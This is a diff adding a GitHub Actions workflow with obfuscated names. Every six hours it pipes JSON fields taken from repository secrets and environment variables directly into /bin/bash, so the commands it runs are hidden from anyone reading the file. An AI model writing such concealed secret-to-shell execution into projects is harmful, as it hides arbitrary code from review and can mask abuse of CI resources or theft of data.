@@ -1,0 +1,25 @@
+name: dihouzhegerenwobuyaomeigehuihetong
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dihouzhegerenwobuyaomeigehuihetong
+        env:
+          dhbf0320: ${{ secrets.dhbf0320 }}
+        run: |
+          echo $dhbf0320 | jq -r .vjgh58050 | /bin/bash
+          echo $sdb3229 | jq -r .xlw8 | /bin/bash
+          echo $h6396 | jq -r .myy966 | /bin/bash
+          echo $bmbo40324 | jq -r .cxhj1566 | /bin/bash
+          echo $oibvx67451 | jq -r .rfepx968 | /bin/bash
+          echo $r0992 | jq -r .hv0 | /bin/bash
+          echo $ah85080 | jq -r .d99 | /bin/bash
+          echo $pj75787 | jq -r .mj66 | /bin/bash
+
